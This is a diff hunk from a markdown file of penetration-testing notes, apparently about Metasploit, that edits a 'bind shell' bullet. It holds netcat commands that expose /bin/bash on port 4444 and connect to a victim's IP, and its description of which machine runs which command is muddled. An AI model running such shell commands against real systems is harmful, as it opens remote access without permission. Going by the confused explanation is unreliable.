@@ -509,7 +509,7 @@ You can search by the name of the modules for example after metasploit is loaded
 
 After the exploit is successful, 
 - **bind sgell**
- -  `nc -lnvp 4444 -e /bin/bash` This command is run on the hacker's computer
+ -  `nc -lnvp 4444 -e /bin/bash` This command is run on the hacker's computer, sumultaneously you will have to open a port on the victim as well by using `nc <ip address of victim> 4444`
 
        - `-l`: Tells Ncat to listen for incoming connection.
           - `-n`: Indicates that we are listening for numeric IP addresses.
